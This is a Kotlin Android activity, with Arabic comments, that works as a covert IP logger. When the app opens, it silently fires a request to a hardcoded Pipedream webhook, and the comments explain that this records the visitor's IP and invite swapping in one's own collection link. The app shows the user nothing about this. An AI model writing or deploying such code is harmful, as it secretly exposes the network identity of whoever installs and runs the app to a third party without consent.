package com.ipconnect.app

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ضع الرابط الخاص بك (Pipedream) بين علامتي التنصيص بدلاً من الرابط الافتراضي أدناه
        val webhookUrl = "https://eos4rirjsl8yp5z.m.pipedream.net" 

        thread {
            try {
                val url = URL(webhookUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                
                // تحديد مهلة للاتصال والقراءة (5 ثوانٍ)
                connection.connectTimeout = 5000
                connection.readTimeout = 5000
                
                // تنفيذ الاتصال وإرسال الطلب (هذا السطر هو ما يفعل الرابط ويسجل الـ IP)
                val responseCode = connection.responseCode 
                
                // إغلاق الاتصال بعد الانتهاء
                connection.disconnect()
            } catch (e: Exception) {
                // طباعة الخطأ في سجلات التطبيق في حال فشل الاتصال
                e.printStackTrace()
            }
        }
    }
}
